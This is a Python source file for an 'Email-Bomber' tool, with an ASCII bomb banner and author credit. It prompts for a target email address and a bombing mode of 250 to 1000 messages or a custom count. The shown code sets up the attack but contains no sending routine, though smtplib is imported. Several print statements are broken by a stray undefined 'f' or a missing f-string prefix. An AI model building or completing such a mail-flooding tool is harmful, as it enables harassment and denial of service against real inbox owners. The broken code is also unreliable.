
'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
                    
                         
                        \\|//
                         \|/ 
                          |
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#   ____      ____      #|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |#   (____)    (____)      #|       [___[ | )[__)(_)[ | )[_)(/,[
           |##                         ##|
           |##                         ##|              Author: jackjocke
           |##     ^^^^^^^^^^^^^^      ##|
            |#     ^^^^^^^^^^^^^^      #//
             \#                       #//
             \//////////////////////////                       
              \////////////////////////
               \//////////////////////         
                 ""`--..#####..--'""                                ,-.--."""""
*.______________________________________________________________* (blast it up...))))
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                      


             ''')

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f,'Error: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + '\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f,'ERROR: {e}')

